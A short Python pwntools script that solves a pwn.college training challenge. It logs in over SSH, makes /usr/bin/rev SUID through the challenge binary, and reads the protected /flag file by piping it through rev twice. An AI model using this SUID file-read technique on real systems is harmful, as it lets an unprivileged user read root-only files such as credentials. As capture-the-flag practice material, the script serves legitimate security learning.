from pwn import ssh, context, log

# Set the logging level
context.log_level = "info"

# Connect to pwn.college SSH
s = ssh(host="dojo.pwn.college", user="hacker", raw=True)

# First run /challenge/babysuid_level10 to make /usr/bin/rev SUID
s.process("/challenge/babysuid_level10")

# Start a bash shell
sh = s.shell()

# Send the command to run /usr/bin/rev /flag
# ? the rev command reverses the flag
# ? Pipe to rev with "| rev" to reverse the flag again and get the original
sh.sendline(b"/usr/bin/rev /flag | /usr/bin/rev")
sh.recvuntil(b"pwn.college")

# Receive the output
log.success(f"pwn.college{sh.recvline().decode().strip()}")

# Close the SSH connection
s.close()
